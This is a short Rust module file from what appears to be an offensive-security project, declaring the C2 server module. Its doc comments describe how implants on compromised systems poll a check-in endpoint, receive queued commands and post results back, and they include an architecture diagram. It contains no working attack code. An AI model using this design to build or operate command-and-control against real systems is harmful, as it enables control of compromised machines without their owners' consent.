/*
// Author: Aliasgar Khimani (NovusEdge)
// Project: github.com/ARaChn3/remy
//
// Copyright: MIT License
// See the LICENSE file for more info.
*/

//! C2 (Command & Control) Server module.
//!
//! The C2 server is the attacker's interface for managing compromised
//! systems. It provides:
//!
//! - An HTTP API for implants to check in and receive commands
//! - Session management for tracking connected implants
//! - A web UI for easy interaction (optional)
//! - Command queuing and result collection
//!
//! ## Architecture
//!
//! ```text
//! +------------------+       HTTP        +------------------+
//! |    Implant(s)    | <--------------> |    C2 Server     |
//! +------------------+                   +--------+---------+
//!                                                 |
//!                                        +--------+---------+
//!                                        |     Web UI       |
//!                                        |   (Operator)     |
//!                                        +------------------+
//! ```
//!
//! Implants periodically poll the server's /api/checkin endpoint.
//! The server responds with any queued commands. Implants execute
//! commands and POST results back to /api/result.

pub mod http;
pub mod sessions;
pub mod api;
pub mod embed;

pub use http::*;
pub use sessions::*;
